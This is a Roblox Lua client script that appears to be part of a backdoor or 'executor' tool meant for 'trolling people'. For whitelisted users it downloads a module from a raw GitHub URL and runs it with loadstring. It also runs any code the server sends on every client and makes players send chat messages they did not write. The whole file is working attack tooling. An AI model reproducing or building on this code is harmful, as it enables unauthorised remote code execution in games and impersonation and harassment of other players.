local UIS = game:GetService("UserInputService")
local a = game:GetService("ReplicatedStorage"):WaitForChild("returnwhitelist", 99999):InvokeServer()
local runservice = game:GetService("RunService")
local chat = game:GetService("TextChatService")
local players = game:GetService("Players")

local player = players.LocalPlayer

UIS.InputBegan:Connect(function(input, gameproccessed)
	if gameproccessed then return end

	if input.KeyCode == Enum.KeyCode.KeypadEnter then
		game:GetService("ReplicatedStorage"):WaitForChild("givegui", 99999):FireServer()
	end
end)

game:GetService("ReplicatedStorage"):WaitForChild("initclient", 99999).OnClientEvent:Connect(function(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	if a == true then
		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))

		local loadstrng = game:GetService("ReplicatedStorage"):WaitForChild("gethttp", 99999):InvokeServer("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua")

		local module = loadstring(loadstrng)()

		module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	end
end)

game:GetService("ReplicatedStorage"):WaitForChild("runclient", 99999).OnClientEvent:Connect(function(code, ...)
	local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
	
	loadstring(code)(...)
end)

game:GetService("ReplicatedStorage"):WaitForChild("fc", 99999).OnClientEvent:Connect(function(msg)
	if chat.ChatVersion == Enum.ChatVersion.LegacyChatService then
		player.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:CaptureFocus()
		player.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text = msg
		player.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:ReleaseFocus(true)
	else
		chat:FindFirstChild("TextChannels").RBXGeneral:SendAsync(msg)
	end
end)

if a == true then
	game:GetService("StarterGui"):SetCore("SendNotification" , {
		Title = "welcome "..player.Name.."!";
		Text = "enjoy trolling people lol";
		Icon = nil;
		Duration = 5;
	})
end